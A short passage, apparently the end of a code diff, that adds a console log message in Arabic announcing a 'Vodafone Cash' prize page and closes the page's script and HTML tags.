+        console.log("صفحة ربح فودافون كاش جاهزة - نظام الجوائز الذكي");
+    })();
 </script>
 </body>
 </html>
